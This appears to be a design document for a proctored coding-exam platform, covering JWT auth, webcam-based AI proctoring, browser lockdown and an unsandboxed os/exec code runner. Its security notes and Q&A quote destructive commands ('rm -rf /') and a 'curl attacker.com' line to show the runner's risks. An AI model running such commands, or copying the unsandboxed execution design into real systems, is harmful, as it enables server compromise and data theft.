3.3 State Management — Three React Contexts

AuthContext (AuthContext.tsx)

State: user: UserProfile | null
Derived: role, isAuthenticated
Persistence: localStorage keys codeshield_auth_user and codeshield_token
On Mount: If codeshield_token exists in localStorage, calls api.user.getProfile() to rehydrate the user profile from the backend. If the token is expired, the backend returns 401 and localStorage is cleared.

MonitoringContext (MonitoringContext.tsx)

State: confidenceScore (starts at 94), riskScore (starts at 12), warningsCount (starts at 1), isLocked, lockReason, cameraActive, micActive, isFullscreen, tabFocused, events[]

Key mechanism — reportViolation():

  1. Creates a MonitoringEvent via api.monitor.reportEvent()
  2. Adds it to the local events array
  3. Adjusts confidenceScore by adding the negative impact value
  4. Increases riskScore
  5. If severity is High or Critical, increments warningsCount
  6. If warningsCount >= 3 OR severity is Critical, sets isLocked = true (exam lockout)
  7. Otherwise shows a warning modal with count (e.g., "2/3")

Copy/Paste Protection Integration: Invokes useCopyPasteProtection hook when isLocked || isFullscreen. Violations are mapped from keyboard keys to event types (e.g., 'c' → "Copy Attempt (Ctrl+C)", severity Medium, impact -8).

Heartbeat: Every 5 seconds, sends api.monitor.sendHeartbeat() with candidateId, confidence, camera, and fullscreen status.

ExamContext (ExamContext.tsx)

State: problems[], currentProblem, selectedLanguage (default 'go'), codeMap (per-language code strings), compilerResult, isRunning, isSubmitting, secondsRemaining, timerStatus, autoSaveStatus

Timer Synchronization:

  • Polling: Every 1,500ms, calls api.timer.getStatus() which hits GET /api/timer/status on the backend. Updates timerStatus, durationMinutes, secondsRemaining.
  • Local ticker: When timerStatus === 'RUNNING', a setInterval decrements secondsRemaining every 1 second. When it reaches 0, sets timerStatus = 'ENDED'.
  • Auto-save simulation: After typing, a debounced 600ms timer sets autoSaveStatus = 'Saving...' → then 400ms later sets 'Saved'.

Code Execution:

  • runCode(): Calls api.compiler.run(code, language, customInput, problemId) → sets compilerResult
  • submitCode(): Calls api.compiler.submit(code, language, problemId) → if all tests pass, sets isSubmittedSuccessfully = true and exits fullscreen

3.4 The Massive API Client — api/client.ts

This 1,367-line file is the single most important frontend file. It implements a dual-mode architecture:

  1. Online mode: Sends real HTTP requests to the Go backend using fetch() with Bearer JWT
  2. Offline fallback: If the backend is unreachable (sleeping Render.com instance, network error), falls back to localStorage-based simulation

fetchWithTimeout(): All backend calls use a 3.5-second AbortController timeout to prevent the UI from hanging while Render.com cold-starts.

5.3 SQL Injection Prevention

All database queries go through GORM's parameterized query builder. For example:

r.db.Where("email = ?", email).First(&user)

GORM uses prepared statements internally, binding email as a parameter — never string-concatenated into SQL. This prevents SQL injection at the ORM layer.

5.4 Password Storage

Passwords are hashed using bcrypt with bcrypt.DefaultCost (10 rounds). The bcrypt hash is stored in the password column. The json:"-" struct tag ensures passwords are never serialized in API responses.

6.2 Auth Flow — Candidate Login

1. Frontend: POST /api/auth/login { email, password }
2. Controller: Bind JSON → Validate with binding tags
3. Service.AuthenticateUser():
   a. userRepo.FindByEmail(email) → SQL: SELECT * FROM users WHERE email = ?
   b. If not found → "invalid email or password"
   c. bcrypt.CompareHashAndPassword(stored_hash, password)
   d. If mismatch → "invalid email or password"
   e. generateToken(userID, email, "user", JWTSecret, 24h)
      → jwt.NewWithClaims(HS256, claims) → SignedString(secret)
4. Controller: 200 OK { success:true, data: { user: UserResponse, token: "eyJ..." } }
5. Frontend (api/client.ts):
   a. localStorage.setItem('codeshield_token', token)
   b. localStorage.setItem('codeshield_auth_user', JSON.stringify(profile))
   c. AuthContext.setUser(profile)

RequireAuth() User JWT secret Must be role == "user" Exam, compiler, profile
RequireAdmin() User JWT secret Must be role == "admin" or "ADMIN" Timer control, problem creation, malpractice viewing
RequireAnyAuth() User JWT secret Any role accepted Profile endpoints shared by both

[!WARNING] Security Issue: Both RequireAdmin() and RequireAuth() validate tokens against the same JWTSecret (not AdminJWTSecret). The AdminJWTSecret config field exists but is never used for validation — admin tokens are also generated with JWTSecret. The AdminJWTExpiry (12h) is used during token generation, but validation uses the same secret. This means any valid user token cannot impersonate an admin because the role claim is checked, but the separate admin secret provides no additional security.

6.5 Frontend Route Protection

In AppRoutes.tsx, the AdminOnly component checks useAuth().role === 'admin'. If not admin, redirects to /admin/login.

[!NOTE] Candidate routes (/dashboard, /exam, etc.) are NOT protected at the routing level — any visitor can navigate there. Protection relies on the backend API rejecting requests without valid tokens.

7. SECURE CODING ASSESSMENT SYSTEM

7.1 Code Execution Engine

The compiler_service.go implements a multi-language code execution engine using os/exec.

Supported Languages

Language File Extension Compile Command Run Command
Go .go go build -o program main.go ./program
Python .py N/A (interpreted) python3 solution.py
JavaScript .js N/A node solution.js
TypeScript .ts N/A node solution.ts
Java .java javac ClassName.java java -cp tmpDir ClassName
C++ .cpp g++ -O3 solution.cpp -o program ./program
Rust .rs rustc solution.rs -o program ./program

Execution Pipeline (e.g., Go)

1. Validate code size <= 102,400 bytes
2. os.MkdirTemp() → create isolated temp directory
3. os.WriteFile() → write source code to temp file
4. context.WithTimeout(5s) → create deadline context
5. exec.CommandContext("go", "build", "-o", binPath, srcFile)
   → CombinedOutput() → if error, return compilation error
6. Concatenate all test case inputs with newlines
7. exec.CommandContext(binPath) with stdin from test cases
   → Capture stdout, stderr
   → If context.DeadlineExceeded → "time limit exceeded"
   → If error → "runtime error: <stderr>"
8. defer os.RemoveAll(tmpDir) → cleanup
9. Return trimmed stdout

Run vs Submit

  • Run (POST /api/compiler/run): Executes against sample test cases only. Returns raw output.
  • Submit (POST /api/compiler/submit): Executes against all test cases (sample + hidden) individually. Compares output to expected, counts passed. Records a Submission in the database. Updates the leaderboard.

Verdict Logic

if passed == totalCases {
    verdict = "Accepted"   // Score: 100
} else if lastError != "" {
    verdict = "Runtime Error"
} else {
    verdict = "Wrong Answer"
}

[!CAUTION] CRITICAL SECURITY RISK: Code execution uses os/exec to run arbitrary user-submitted code directly on the server with no sandboxing, no containerization, no chroot, no resource limits (beyond timeout). A malicious candidate could execute rm -rf /, read environment variables, access the filesystem, or run network commands. This is acceptable for a prototype/demo but NOT production-safe.

8.2 Escape Key Anti-Bypass Mechanism

In Chromium browsers, holding Escape for 2 seconds exits fullscreen. The code intercepts this:

  1. Captures Escape keydown in the capture phase (addEventListener(event, handler, true))
  2. Calls e.preventDefault() + e.stopImmediatePropagation()
  3. Uses navigator.keyboard.lock() / navigator.keyboard.unlock() cycle to reset Chrome's internal exit timer
  4. If Escape is held >1 second (detected via e.repeat and timestamp diff), triggers a Critical violation and a 2-minute lockout with setTimeout(unlockExam, 120000)

8.3 Copy/Paste Protection Layer

The useCopyPasteProtection.ts hook provides a second layer of protection:

  • Intercepts 13 events in the capture phase: keydown, keyup, contextmenu, copy, paste, cut, dragstart, drop, selectstart, beforecopy, beforepaste, beforecut
  • Injects a <style> element with user-select: none !important on all elements
  • Allows exceptions for input, textarea, and [contenteditable] elements
  • Clears clipboard on PrintScreen via navigator.clipboard.writeText('')

10. REAL-TIME COMMUNICATION

10.1 WebSocket — YOLOv8 Proctor

Why WebSocket instead of HTTP polling? Each AI inference requires sending a full video frame (≈40-80KB base64 JPEG) and receiving results. At 5 frames/second, HTTP would add per-request overhead (TCP handshake, headers, connection establishment). WebSocket maintains a persistent bidirectional channel with minimal framing overhead.

Connection lifecycle:

  1. Client creates new WebSocket(wsUrl) on component mount
  2. Server accepts via @app.websocket("/ws/proctor") in FastAPI
  3. Client sends JSON { image: "data:image/jpeg;base64,..." } every 200ms
  4. Server responds with JSON { detected, object, confidence, message }
  5. On disconnect: 4-second reconnect timer (setTimeout(connectWS, 4000))
  6. On cleanup (component unmount): ws.close(), clear reconnect timer

Security: No authentication on WebSocket connection. Anyone who knows the URL can connect.

10.2 Timer Polling (Not WebSocket)

The exam timer uses HTTP polling (every 1,500ms via setInterval) rather than WebSocket because:

  • Timer state changes infrequently (admin controls it)
  • Simplifies server architecture (no stateful connections)
  • Backend Render.com free tier may not support persistent WebSocket for all services

12. EMAIL NOTIFICATION SYSTEM

12.1 Architecture

The email_service.go uses the Resend HTTP API (https://api.resend.com/emails).

Flow

MalpracticeService.LogViolation()
  → repo.Create(logEntry)  // DB insert FIRST
  → if emailService != nil:
       go emailService.SendMalpracticeAlert(logEntry)  // Goroutine — non-blocking

The email is sent asynchronously in a goroutine after the database insert succeeds. This ensures:

  1. The API response to the frontend is never delayed by email sending
  2. If email fails, the malpractice record is already safely persisted
  3. A defer recover() in SendMalpracticeAlert prevents panics from crashing the server

Email Construction

  • Subject: [Malpractice Alert] <event_type> — <candidate_name>
  • Body: Professional HTML email with dark theme, severity badge (color-coded), candidate details table, IST timestamp
  • XSS prevention: All dynamic values pass through html.EscapeString() before being embedded in HTML
  • Per-admin sending: Emails are sent individually to each admin (not CC'd) to avoid Resend free tier rejecting unverified emails

26. TECHNICAL JURY / INTERVIEW QUESTIONS

Beginner Questions

Q: What is the role of JWT in this project?
A: JWT (JSON Web Token) is used for stateless authentication. When a user logs in, the Go backend generates a token signed with HMAC-SHA256 containing the user's ID, email, and role. This token is stored in localStorage and sent as a Bearer token in the Authorization header of subsequent API requests. The middleware extracts and validates this token on each request, eliminating the need for server-side session storage.
Proof: auth_service.go:186-200

Q: How does the system store passwords?
A: Passwords are hashed using bcrypt with a cost factor of 10 (the Go bcrypt.DefaultCost). The raw password is never stored. During login, bcrypt.CompareHashAndPassword() compares the stored hash with the provided password.
Proof: auth_service.go:50

Advanced Questions

Q: Why do you have both COCO-SSD and YOLOv8 for the same detection task?
A: Redundancy and resilience. COCO-SSD runs in the browser via TensorFlow.js — it works even when the YOLO server is offline (Render.com cold start). YOLOv8 is more accurate and runs on the server. If either system detects a forbidden object, the alert fires. They operate on different confidence thresholds (COCO: 0.28 for phones; YOLO: 0.30).
Proof: AICameraWidget.tsx:400-473 and main.py:56-86

Q: What happens if the database is completely unreachable?
A: The backend has a triple fallback: Supabase PostgreSQL → local PostgreSQL → SQLite. If even SQLite fails, log.Fatalf terminates the server. The frontend has its own fallback: if the backend API is unreachable (3.5s timeout), it switches to localStorage-based simulation, allowing the UI to function in demo mode.

Security Questions

Q: Can a candidate bypass the fullscreen enforcement?
A: Partially. The code intercepts Escape key in the capture phase and uses navigator.keyboard.lock() to prevent the Chromium 2-second hold-to-exit mechanism. However, Alt+F4 closes the browser entirely. On some OS/browser combinations, the keyboard lock API is not supported. The system logs the fullscreen exit as a High severity violation (-15 points) regardless.

Q: Is the code execution secure for production?
A: No. Code runs directly on the server via os/exec without sandboxing. A malicious candidate could execute os.Remove("/") in Go, import os; os.system("curl attacker.com") in Python, etc. For production, each execution should run in an isolated Docker container with network disabled, filesystem restrictions, and cgroup resource limits.

27. "WHY DID YOU BUILD IT THIS WAY?" QUESTIONS

Q: Why Go for the backend instead of Node.js?
A: Go offers superior concurrency handling through goroutines (used for async email sending), compiles to a single binary (simplifies deployment), has strong typing (catches errors at compile time), and the Gin framework provides fast HTTP routing. Node.js would work but Go's os/exec process management and goroutine-based parallelism make it better suited for a code execution engine.

Q: Why Supabase instead of MongoDB or Firebase?
A: The data model is relational — users have exam sessions, sessions have submissions, problems have test cases. PostgreSQL's ACID transactions, foreign keys, and JOIN capabilities are essential (e.g., the leaderboard JOINs users with scores). Supabase provides a managed PostgreSQL instance with a generous free tier, connection pooling, and no configuration overhead.

Q: What happens if the webcam is disabled?
A: The camera request is wrapped in a try/catch. If getUserMedia fails, cameraActive remains true but no stream is attached. COCO-SSD and MediaPipe cannot process frames, so AI detections stop. The YOLO WebSocket receives no frames. This is a limitation — the system should flag when the camera is unavailable.

Q: Can your code execution server be attacked?
A: Yes. The current implementation runs user code directly on the server with the same permissions as the Go process. Mitigations include: 5-second timeout (prevents infinite loops), code size limit (100KB), and temp directory cleanup. But a skilled attacker could read environment variables (including DB passwords), execute network requests, or modify the filesystem.

Q: What would you change for production?
A: (1) Containerized code execution (Docker per submission); (2) Restrict CORS to specific domains; (3) Add rate limiting; (4) Move JWT to httpOnly cookies; (5) Protect admin registration; (6) Add WebSocket authentication; (7) Implement token revocation; (8) Remove credentials from render.yaml; (9) Add CI/CD with automated tests; (10) Replace timer polling with WebSocket.

Frontend: A React 19 SPA built with Vite and TypeScript, using TailwindCSS for styling. MonitoringContext is the security brain — it maintains a confidence score starting at 94 that decreases with each violation, a risk score, and a warning counter that locks the exam after 3 high-severity warnings.

The useCopyPasteProtection hook adds a second layer with CSS user-select injection and 13 more capture-phase handlers.
